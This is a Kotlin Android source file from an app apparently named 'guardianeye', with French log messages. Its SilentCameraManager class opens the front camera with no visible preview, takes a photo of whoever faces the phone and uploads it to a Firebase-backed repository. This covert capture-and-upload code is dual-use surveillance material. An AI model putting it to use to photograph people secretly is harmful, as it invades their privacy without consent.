package com.example.guardianeye.camera

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.example.guardianeye.repository.FirebaseRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream

class SilentCameraManager(private val context: Context) {

    private val repository = FirebaseRepository()
    private val handlerThread = HandlerThread("CameraThread")
    private lateinit var handler: Handler

    init {
        handlerThread.start()
        handler = Handler(handlerThread.looper)
    }

    suspend fun takeSilentPhoto(deviceId: String) {
        Log.d("SilentCamera", "Démarrage capture...")

        try {
            val cameraManager = context.getSystemService(
                Context.CAMERA_SERVICE
            ) as CameraManager

            var frontCameraId: String? = null
            for (cameraId in cameraManager.cameraIdList) {
                val chars = cameraManager
                    .getCameraCharacteristics(cameraId)
                val facing = chars.get(
                    CameraCharacteristics.LENS_FACING
                )
                if (facing ==
                    CameraCharacteristics.LENS_FACING_FRONT
                ) {
                    frontCameraId = cameraId
                    break
                }
            }

            if (frontCameraId == null) {
                Log.e("SilentCamera",
                    "Caméra frontale non trouvée ❌")
                return
            }

            val imageReader = ImageReader.newInstance(
                1280, 720,
                ImageFormat.JPEG,
                2
            )

            var photoTaken = false

            imageReader.setOnImageAvailableListener({ reader ->
                if (photoTaken) return@setOnImageAvailableListener
                photoTaken = true

                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        val photoFile = File(
                            context.cacheDir,
                            "guardian_${System.currentTimeMillis()}.jpg"
                        )
                        FileOutputStream(photoFile).use {
                            it.write(bytes)
                        }

                        Log.d("SilentCamera",
                            "Photo capturée ✅ ${bytes.size} bytes")

                        CoroutineScope(Dispatchers.IO).launch {
                            try {
                                repository.uploadPhoto(
                                    deviceId, photoFile
                                )
                                Log.d("SilentCamera",
                                    "Photo uploadée ✅")
                            } catch (e: Exception) {
                                Log.e("SilentCamera",
                                    "Erreur upload: ${e.message}")
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("SilentCamera",
                            "Erreur: ${e.message}")
                        image?.close()
                    }
                }
            }, handler)

            cameraManager.openCamera(
                frontCameraId,
                object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        Log.d("SilentCamera",
                            "Caméra ouverte ✅")
                        try {
                            val surface = imageReader.surface

                            camera.createCaptureSession(
                                listOf(surface),
                                object : CameraCaptureSession
                                .StateCallback() {
                                    override fun onConfigured(
                                        session: CameraCaptureSession
                                    ) {
                                        try {
                                            // Pré-chauffer la caméra
                                            // avec preview request
                                            val previewRequest =
                                                camera.createCaptureRequest(
                                                    CameraDevice
                                                        .TEMPLATE_PREVIEW
                                                ).apply {
                                                    addTarget(surface)
                                                }.build()

                                            // Lancer preview
                                            session.setRepeatingRequest(
                                                previewRequest,
                                                null,
                                                handler
                                            )

                                            // Attendre 2 secondes
                                            // pour que la caméra
                                            // s'ajuste à la lumière
                                            handler.postDelayed({
                                                try {
                                                    // Arrêter preview
                                                    session
                                                        .stopRepeating()

                                                    // Capturer photo
                                                    val captureRequest =
                                                        camera
                                                            .createCaptureRequest(
                                                                CameraDevice
                                                                    .TEMPLATE_STILL_CAPTURE
                                                            ).apply {
                                                                addTarget(surface)
                                                            }.build()

                                                    session.capture(
                                                        captureRequest,
                                                        null,
                                                        handler
                                                    )

                                                    Log.d("SilentCamera",
                                                        "Capture lancée ✅")

                                                    // Fermer après
                                                    // 3 secondes
                                                    handler.postDelayed({
                                                        session.close()
                                                        camera.close()
                                                        imageReader.close()
                                                    }, 3000)

                                                } catch (e: Exception) {
                                                    Log.e("SilentCamera",
                                                        "Erreur capture: ${e.message}")
                                                    session.close()
                                                    camera.close()
                                                }
                                            }, 2000) // 2 secondes d'attente

                                        } catch (e: Exception) {
                                            Log.e("SilentCamera",
                                                "Erreur config: ${e.message}")
                                            session.close()
                                            camera.close()
                                        }
                                    }

                                    override fun onConfigureFailed(
                                        session: CameraCaptureSession
                                    ) {
                                        Log.e("SilentCamera",
                                            "Config failed ❌")
                                        camera.close()
                                    }
                                },
                                handler
                            )
                        } catch (e: Exception) {
                            Log.e("SilentCamera",
                                "Erreur session: ${e.message}")
                            camera.close()
                        }
                    }

                    override fun onDisconnected(
                        camera: CameraDevice
                    ) {
                        camera.close()
                        Log.d("SilentCamera",
                            "Caméra déconnectée")
                    }

                    override fun onError(
                        camera: CameraDevice,
                        error: Int
                    ) {
                        Log.e("SilentCamera",
                            "Erreur caméra: $error")
                        camera.close()
                    }
                },
                handler
            )

        } catch (e: SecurityException) {
            Log.e("SilentCamera",
                "Permission caméra refusée: ${e.message}")
        } catch (e: Exception) {
            Log.e("SilentCamera",
                "Erreur générale: ${e.message}")
        }
    }

    fun shutdown() {
        handlerThread.quitSafely()
    }
}